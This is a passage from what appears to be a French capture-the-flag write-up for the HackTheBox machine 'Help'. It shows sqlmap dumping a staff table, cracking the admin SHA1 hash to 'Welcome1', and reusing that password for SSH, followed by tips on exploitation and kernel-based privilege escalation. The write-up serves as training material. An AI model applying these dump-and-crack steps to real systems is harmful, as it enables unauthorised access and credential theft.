[1] default dictionary file '/opt/tools/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[14:42:23] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[14:42:23] [INFO] starting dictionary-based cracking (sha1_generic_passwd)
[14:42:23] [INFO] starting 12 processes 
[14:42:24] [INFO] cracked password 'Welcome1' for user 'admin'                                                                                                                                                    
Database: support                                                                                                                                                                                                 
Table: staff
[1 entry]
+----+--------------------+------------+--------+---------+----------+---------------+-----------------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+
| id | email              | login      | avatar | admin   | status   | fullname      | password                                            | timezone | username | signature                      | department         | last_login | newticket_notification |
+----+--------------------+------------+--------+---------+----------+---------------+-----------------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+
| 1  | support@mysite.com | 1547216217 | NULL   | 1       | Enable   | Administrator | d318f44739dced66793b1a603028133a76ae680e (Welcome1) | <blank>  | admin    | Best regards,\r\nAdministrator | a:1:{i:0;s:1:"1";} | 1543429746 | 0                      |
+----+--------------------+------------+--------+---------+----------+---------------+-----------------------------------------------------+----------+----------+--------------------------------+--------------------+------------+------------------------+

[14:42:30] [INFO] table 'support.staff' dumped to CSV file '/root/.local/share/sqlmap/output/help.htb/dump/support/staff.csv'
[14:42:30] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/help.htb'

[*] ending @ 14:42:30 /2025-08-27/
```
Après l'utilisation de SQLMap, nous n'avons pas eu besoin de faire une attaque par dictionnaire sur le hachage. En effet, SQLmap s'en est chargé et a trouvé le mot de passe : 
"d318f44739dced66793b1a603028133a76ae680e" --> `Welcome1`.

Il ne reste plus qu'à se connecter en SSH avec l'utilisateur **help** et ce mot de passe.

## Tips
- Quand on trouve une version d'un service exploitable, vraiment pousser au maximum. Tenter plusieurs fois l'exploitation et avec plusieurs code différents.
- Vérifier rapidement le Kernel, en commençant par la date de sa compilation. Faire une recherche de la version rapidement sur internet, ça coûte rien et ici c'était bien la solution. Linpeas ne surlignera pas la version du Kernel.